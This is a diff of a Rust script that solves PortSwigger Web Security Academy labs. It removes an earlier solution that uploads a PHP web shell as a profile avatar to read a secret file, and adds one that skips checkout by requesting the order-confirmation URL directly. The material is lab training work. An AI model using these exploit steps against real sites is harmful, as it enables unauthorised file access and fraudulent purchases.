@@ -1,30 +1,25 @@
-/*************************************************************************
+/*********************************************************************
 *
 * Author: Ahmed Elqalawy (@elqal3awii)
 *
-* Date: 12/10/2023
+* Date: 27/10/2023
 *
-* Lab: Remote code execution via web shell upload
+* Lab: Insufficient workflow validation
 *
 * Steps: 1. Fetch login page
 *        2. Extract the csrf token and session cookie
 *        3. Login as wiener
-*        4. Fetch wiener profile
-*        5. Upload the shell file
-*        6. Fetch the uploaded shell file to read the secret
-*        7. Submit the solution
+*        4. Add the leather jacket to the cart
+*        5. Confirm order directly without checking out
 *
-**************************************************************************/
+**********************************************************************/
 #![allow(unused)]
 /***********
 * Imports
 ***********/
 use regex::Regex;
 use reqwest::{
-    blocking::{
-        multipart::{Form, Part},
-        Client, ClientBuilder, Response,
-    },
+    blocking::{Client, ClientBuilder, Response},
     header::HeaderMap,
     redirect::Policy,
 };
@@ -41,7 +36,7 @@ use text_colorizer::Colorize;
 *******************/
 fn main() {
     // change this to your lab URL
-    let url = "https://0a2500a5031b26d5812ab75300d80033.web-security-academy.net";
+    let url = "https://0ae6000d041d3b8b8098993600f9000b.web-security-academy.net";
 
     // build the client that will be used for all subsequent requests
     let client = build_client();
@@ -58,7 +53,7 @@ fn main() {
     println!("{}", "OK".green());
     print!(
         "{}",
-        "⦗2⦘ Extracting the csrf token and session cookie.. ".white(),
+        "⦗2⦘ Extracting the csrf token and session cookie to login.. ".white(),
     );
     io::stdout().flush();
 
@@ -67,7 +62,8 @@ fn main() {
         .expect(&format!("{}", "[!] Failed to extract session cookie".red()));
 
     // extract csrf token
-    let mut csrf = extract_csrf(login_page).expect(&format!("{}", "[!] Failed to extract the csrf".red()));
+    let mut csrf =
+        extract_csrf(login_page).expect(&format!("{}", "[!] Failed to extract the csrf".red()));
 
     println!("{}", "OK".green());
     print!("{}", "⦗3⦘ Logging in as wiener.. ".white(),);
@@ -90,92 +86,45 @@ fn main() {
         .expect(&format!("{}", "[!] Failed to extract session cookie".red()));
 
     println!("{}", "OK".green());
-    print!("{}", "⦗4⦘ Fetching wiener profile.. ".white(),);
+    print!("{}", "⦗4⦘ Adding the leather jacket to the cart.. ".white(),);
     io::stdout().flush();
 
-    // fetch wiener profile
-    let wiener = client
-        .get(format!("{url}/my-account"))
+    // add the leather jacket to the cart
+    client
+        .post(format!("{url}/cart"))
         .header("Cookie", format!("session={session}"))
+        .form(&HashMap::from([
+            ("productId", "1"),
+            ("redir", "PRODUCT"),
+            ("quantity", "1"),
+        ]))
         .send()
-        .expect(&format!("{}", "[!] Failed to fetch wiener profile".red()));
-
-    // extract csrf token
-    csrf = extract_csrf(wiener).expect(&format!("{}", "[!] Failed to extract the csrf".red()));
-
-    // the shell file to be uploaded
-    let shell_file = r###"<?php echo file_get_contents("/home/carlos/secret") ?>"###;
-
-    // the shell file name
-    // you can change this to what you want
-    let shell_file_name = "hack.php";
-
-    // the avatar part of the request
-    let avatar_part = Part::bytes(shell_file.as_bytes())
-        .file_name(shell_file_name)
-        .mime_str("application/x-php")
         .expect(&format!(
             "{}",
-            "[!] Failed to construct the avatar part".red()
+            "[!] Failed to add the leather jacket to the cart".red()
         ));
-
-    // construct the multipart form
-    let form = Form::new()
-        .part("avatar", avatar_part)
-        .text("user", "wiener")
-        .text("csrf", csrf);
-
-    println!("{}", "OK".green());
-    print!("{}", "⦗5⦘ Uploading the shell file.. ".white(),);
-    io::stdout().flush();
-
-    // upload the shell file
-    client
-        .post(format!("{url}/my-account/avatar"))
-        .header("Cookie", format!("session={session}"))
-        .multipart(form)
-        .send()
-        .expect(&format!("{}", "[!] Failed to upload the shell file".red()));
 
     println!("{}", "OK".green());
     print!(
         "{}",
-        "⦗6⦘ Fetching the uploaded shell file to read the secret.. ".white(),
+        "⦗5⦘ Confirming order directly without checking out.. ".white(),
     );
     io::stdout().flush();
 
-    // fetch the uploaded shell file
-    let uploaded_shell = client
-        .get(format!("{url}/files/avatars/{shell_file_name}"))
+    // confirm order directly without checking out
+    client
+        .get(format!(
+            "{url}/cart/order-confirmation?order-confirmed=true"
+        ))
         .header("Cookie", format!("session={session}"))
         .send()
-        .expect(&format!(
-            "{}",
-            "[!] Failed to fetch the uploaded shell file".red()
-        ));
-
-    // get carlos secret
-    let secret = uploaded_shell.text().unwrap();
-
-    println!("{}", "OK".green());
-    println!("❯ {} {}", "Secret:".blue(), secret.yellow());
-    print!("{} ", "⦗7⦘ Submitting the solution..".white());
-    io::stdout().flush();
-
-    // submit the solution
-    client
-        .post(format!("{url}/submitSolution"))
-        .form(&HashMap::from([("answer", secret)]))
-        .send()
-        .expect(&format!("{}", "[!] Failed to submit the solution".red()));
+        .expect(&format!("{}", "[!] Failed to place order".red()));
 
     println!("{}", "OK".green());
     println!(
         "{} {}",
-        "🗹 Check your browser, it should be marked now as"
-            .white()
-            .bold(),
-        "solved".green().bold()
+        "🗹 Check your browser, it should be marked now as".white(),
+        "solved".green()
     )
 }
 
